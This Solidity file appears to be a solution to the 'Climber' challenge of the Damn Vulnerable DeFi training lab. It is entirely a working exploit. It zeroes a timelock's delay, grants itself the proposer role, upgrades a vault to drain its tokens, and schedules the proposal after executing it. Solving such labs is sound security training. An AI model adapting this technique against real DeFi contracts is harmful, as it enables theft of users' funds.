// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ClimberTimelock} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import {ClimberImplementationExploiter} from "./ClimberImplementationExploiter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberExploiter {
    ClimberTimelock public immutable timelock;
    ClimberVault public immutable vault;
    DamnValuableToken  public immutable token;
    ClimberImplementationExploiter public immutable exploiter;
    address public immutable recovery;
    uint256 public immutable balance;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, DamnValuableToken  _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
        exploiter = new ClimberImplementationExploiter();
        balance = token.balanceOf(address(vault));
    }

    function exploit(bool execute) public returns
        (address[] memory targets, uint256[] memory values,bytes[] memory dataElements, bytes32 salt) {
        salt = ""; // no need for a salt

        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        // Update delay to 0, this is in order to execute immediately
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = 
            abi.encode(
                timelock.updateDelay.selector,
                0
            );

        //  Grant exploiter role via `grantRole`
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            PROPOSER_ROLE,
            address(this)
        );

        // Upgrade and call withdrawAll on the exploiter implementation
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            vault.upgradeToAndCall.selector,
            address(exploiter),
            abi.encodeWithSelector(
                ClimberImplementationExploiter.withdrawAll.selector,
                address(token),
                address(recovery),
                balance
            )
        );

        // Add the proposal to pass
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(
            this.addProposal.selector
        );

        if(execute) {
            timelock.execute(
                targets,
                values,
                dataElements,
                salt
            );
        }
    }

    function addProposal() public {
        address[] memory targets;
        uint256[] memory values;
        bytes[] memory dataElements;
        bytes32 salt;

        (targets, values, dataElements, salt) = exploit(false);

        timelock.schedule(
            targets,
            values,
            dataElements,
            salt
        );
    }
}